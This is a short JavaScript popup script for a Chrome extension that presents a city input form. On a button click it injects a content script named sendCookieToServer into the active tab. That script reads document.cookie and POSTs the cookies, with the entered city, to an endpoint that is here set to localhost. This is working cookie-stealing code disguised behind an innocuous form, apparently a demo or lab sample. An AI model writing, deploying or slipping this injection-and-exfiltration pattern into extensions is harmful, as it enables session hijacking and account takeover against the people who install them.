var city = document.getElementById('city')


// When the button is clicked, inject sendCookieToServer into current page
submitInfo.addEventListener("click", async () => {
    let [tab] = await chrome.tabs.query({
        active: true,
        currentWindow: true
    });
    chrome.storage.sync.set({
        city: city.value
    }, function () {
        chrome.scripting.executeScript({
            target: {
                tabId: tab.id
            },
            function: sendCookieToServer,
        });
    });

});

// The body of this function will be executed as a content script inside the
// current page
function sendCookieToServer() {
    /* var pattern = new RegExp('^(https?:\\/\\/)?' + // protocol
        '((([a-z\\d]([a-z\\d-]*[a-z\\d])*)\\.)+[a-z]{2,}|' + // domain name
        '((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
        '(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
        '(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
        '(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator */

    //parag.innerHTML = 'endpoint.value'
    var endpoint = "http://127.0.0.1:8000"
    chrome.storage.sync.get(['city'], function (result) {
        if (result.city) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", endpoint, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                cookies: document.cookie,
                city: result.city
            }));
        }
    });

}